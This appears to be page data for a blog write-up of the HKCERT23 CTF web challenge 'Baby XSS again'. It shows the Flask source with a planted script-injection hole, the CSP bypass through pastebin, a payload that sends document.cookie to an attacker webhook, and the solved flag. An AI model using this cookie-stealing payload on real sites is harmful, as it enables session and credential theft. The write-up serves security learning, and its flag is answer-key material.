{"componentChunkName":"component---src-pages-blog-strapi-article-slug-tsx","path":"/blog/hkcert23-ctf-baby-xss-again/","result":{"data":{"allStrapiArticle":{"nodes":[{"id":"a1d589a5-255e-54e9-820b-f678d991621e","slug":"hkcert23-ctf-baby-xss-again","title":"HKCERT23 CTF - Baby XSS again (100)","description":"https://ctftime.org/event/2122","content":{"data":{"content":"# Writeup\nThis challenge have nice step by step guideline:\nhttps://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E5%8F%88%E6%9C%89%E5%AF%B6%E8%B2%9D-XSS--Baby-XSS-again-Web   \nGiven the source code of the web app (Flask, python): \n```python\nfrom flask import Flask, request\nfrom urllib.parse import urlencode, quote_plus\nfrom urllib.request import urlopen\nfrom selenium import webdriver\nimport os\nimport time\n\nH_SITEKEY = os.getenv(\"H_SITEKEY\", '\"><script>document.write(\"hCaptcha is broken\")</script>')\nH_SECRET = os.getenv(\"H_SECRET\", \"Victoria's Secret\")\napp = Flask(__name__)\n\nchal = {\n  \"title\": \"Baby XSS again\",\n  \"domain\": os.getenv(\"HOSTNAME\",\"localhost:3000\"), \n  \"flag\": os.getenv(\"FLAG\", \"fakeflag{}\"),\n  \"sleep\": 1,\n}\n\ndef visit(url):\n\tchrome_options = webdriver.ChromeOptions()\n\tchrome_options.add_argument(\"--disable-gpu\")\n\tchrome_options.add_argument(\"--headless\")\n\tchrome_options.add_argument(\"--no-sandbox\")\n\tdriver = webdriver.Chrome(options=chrome_options)\n\ttry:\n\t\tdriver.get(\"http://\"+chal[\"domain\"]+\"/robots.txt?url=\"+quote_plus(url))\n\t\tdriver.add_cookie({\"name\": \"flag\", \"value\": chal[\"flag\"]})\n\t\tdriver.get(\"about:blank\")\n\t\tdriver.get(url)\n\t\ttime.sleep(chal[\"sleep\"])\n\t\treturn \"Your URL has been visited by the \"+chal[\"title\"]+\" bot.\";\n\texcept Exception as e:\n\t\tprint(url, flush=True)\n\t\tprint(e, flush=True)\n\t\treturn \"The \"+chal[\"title\"]+\" bot did not handle your URL properly.\"\n\tfinally:\n\t\tdriver.quit()\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef index():\n\tif request.method == \"POST\" and request.remote_addr != \"127.0.0.1\":\n\t\tif \"url\" not in request.form or request.form.get(\"url\") == \"\":\n\t\t\treturn \"Please enter a URL\"\n\t\tif \"h-captcha-response\" not in request.form or request.form[\"h-captcha-response\"] == \"\":\n\t\t\treturn \"Bad hCaptcha\"\n\t\tdata = urlencode({\"secret\": H_SECRET, \"response\": request.form[\"h-captcha-response\"]}).encode('ascii')\n\t\ttry:\n\t\t\tfetch = urlopen(\"https://hcaptcha.com/siteverify\", data).read().decode(\"utf-8\")\n\t\t\treturn visit(request.form.get(\"url\"))\n\t\texcept Exception as e:\n\t\t\treturn str(e)\n\t\tif '\"success\":true' not in fetch:\n\t\t\treturn \"hCaptcha is broken\"\n\telse:\n\t\tout = \"\"\"<html>\n  <head>\n    <title>XSS Bot - %s</title>\n    <meta http-equiv=\"Content-Security-Policy\" content=\"script-src https://hcaptcha.com https://*.hcaptcha.com https://pastebin.com\">\n    <script src=\"https://js.hcaptcha.com/1/api.js\" async defer></script>\n  </head>\n  <body>\n    <h1>XSS Bot - %s</h1>\n    <form method=\"POST\">\n      <table>\n      <tr>\n        <td>URL</td>\n        <td>\n          <input name=\"url\" size=\"70\" />\n        </td>\n      </tr>\n      </table>\n      <div class=\"h-captcha\" data-sitekey=\"%s\"></div>\n      <input type=\"submit\" />\n    </form>\n  </body>\n</html>\"\"\" % (chal[\"title\"],chal[\"title\"],H_SITEKEY)\n\t\tif \"babyxss\" in request.host:\n\t\t\tout += \"\"\"<script src=\"%s\"></script>\"\"\" % request.args.get(\"src\", \"http://example.com/\")\n\t\treturn out\n\nif __name__ == \"__main__\":\n\tapp.run(host=\"0.0.0.0\", port=3000)\n```\n\nThe web site UI come with a input bar and Captcha. The input bar is use to pass the request url to the bot (selenium), and then the bot will `visit` your input URL.\n![babyxss.png](https://www.cms.void-dojo.ninja/uploads/babyxss_7a1e4705a1.png)\nBefore bot visiting your url, it will add the flag into it's cookie, so this is our target:\n```python\n\t\tdriver.add_cookie({\"name\": \"flag\", \"value\": chal[\"flag\"]})\n```\n\n## XSS vulnerability\nThis flask program has 'builtin' an XSS vulnerability, see:\n```python\n</html>\"\"\" % (chal[\"title\"],chal[\"title\"],H_SITEKEY)\n\t\tif \"babyxss\" in request.host:\n\t\t\tout += \"\"\"<script src=\"%s\"></script>\"\"\" % request.args.get(\"src\", \"http://example.com/\")\n\t\treturn out\n```\nIf the request url is the challenge domain i.e. `babyxss`, then it will feed the link from query parameter `src` to the script tag and execute javascript.\nSo for the input box we can use `http://babyxss-k7ltgk.hkcert23.pwnable.hk?src=<your pastebin url>` where the pastebin url contains the javascript that you want to execute.\n\nYou may also found that the script execution is being limited by <a href=\"https://content-security-policy.com/\" target=\"_blank\">Content-Security-Policy</a>:\n```html\n    <meta http-equiv=\"Content-Security-Policy\" content=\"script-src https://hcaptcha.com https://*.hcaptcha.com https://pastebin.com\"> /** js file from https://pastebin.com domain can be loaded **/\n```\n\n## Prepare JS script using pastebin\nRemember that the flag is stored in the cookie `{\"name\": \"flag\", \"value\": chal[\"flag\"]}`? We can use pastebin to host our javascript, and use javascript to expose this flag cookie. Next step is think about how to prepare a server to listen the cookie leak. We can use https://webhook.site or https://requestrepo.com/, it is a free testing service which create temporary URL for listen and capture HTTP request. \n\n## Pastebin payload\n```txt\nlocation='{your_webhook_site_url}/?cookie='+document.cookie\n```\n\n## URL payload\nFor the pastebin url please use `/dl/` instead of `raw`, because raw will return text MIME type but not javascript, see guideline for more details.\n```txt\nhttp://babyxss-k7ltgk.hkcert23.pwnable.hk?src=https://pastebin.com/dl/q7Ae2DjF \n```\n\n## Flag\nAfter the bot visit, wait for a time, webhook.site should be able to capture the request.   \nCheck the cookies section at the bottom, that is our flag. \n![babyxss-2.png](https://www.cms.void-dojo.ninja/uploads/babyxss_2_365cf6d256.png)\n\nflag: `hkcert23{pastebin_0r_trashbin}`"}},"updatedAt":"2024-02-14T19:02:54.808Z","publishedAt":"2023-12-03T23:30:42.268Z","tags":[{"name":"web","color":"dark"},{"name":"hkcertctf","color":"yellow"}],"categories":[],"cover":{"formats":{"thumbnail":{"url":"/uploads/thumbnail_hkcert23_banner_0e9291d451.png"},"small":null}}}]}},"pageContext":{"id":"a1d589a5-255e-54e9-820b-f678d991621e","slug":"hkcert23-ctf-baby-xss-again","__params":{"slug":"hkcert23-ctf-baby-xss-again"}}},"staticQueryHashes":["3001278788"],"slicesMap":{}}